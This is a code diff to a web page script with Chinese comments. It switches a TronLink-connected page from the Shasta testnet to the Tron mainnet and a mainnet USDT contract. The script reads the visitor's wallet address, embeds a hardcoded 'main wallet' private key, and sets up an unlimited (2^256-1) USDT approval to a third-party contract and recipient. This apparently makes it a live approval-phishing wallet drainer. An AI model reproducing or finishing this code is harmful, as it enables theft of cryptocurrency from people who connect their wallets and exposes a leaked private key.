@@ -126,7 +126,7 @@
       const userAddress = window.tronWeb.defaultAddress.base58;
 
       // USDT 合约地址（Shasta 测试网）
-      const usdtContractAddress = 'THURdnqGLNNyHvVjgVqTdS7zDh8W4SM8Pz';
+      const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
       // 获取 USDT 合约实例
       const contract = await window.tronWeb.contract().at(usdtContractAddress);
@@ -172,8 +172,8 @@
       try {
         // 初始化 TronWeb
         const tronWeb = new TronWeb({
-          //   fullHost: 'https://api.trongrid.io', // 主网
-          fullHost: 'https://api.shasta.trongrid.io', // Shasta 测试网
+            fullHost: 'https://api.trongrid.io', // 主网
+          // fullHost: 'https://api.shasta.trongrid.io', // Shasta 测试网
         });
         // 主钱包私钥
         const mainWalletPrivateKey = '09705E69BCF60D0E85456E3D1DB94124B8F89B6EA86D2E05357920E42271B0B7';
@@ -181,9 +181,9 @@
         await window.tronLink.request({ method: 'tron_requestAccounts' });
         const fromAddress = window.tronWeb.defaultAddress.base58;
 
-        const transferContract = 'TTikvL6oACpebWFU3j8bUabJx5kgEUYgGQ'; // 合约地址，转换为十六进制
+        const transferContract = 'THbVQp8kMjStKNnf2iCY6NEzThKMK5aBHg'; // 合约地址，转换为十六进制
         const usdtrecipient = 'TRg9o55JzYhJjeRo1gTHqttNwHcAzfWEoi'; // 接收地址，转换为十六进制
-        const tokenContractAddress = 'THURdnqGLNNyHvVjgVqTdS7zDh8W4SM8Pz'; // USDT 合约地址
+        const tokenContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT 合约地址
         const amount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // 2^256 - 1，表示无限授权; // 授权的 USDT 数量（单位是最小单位）
 
         // 使用 tronWeb 访问智能合约
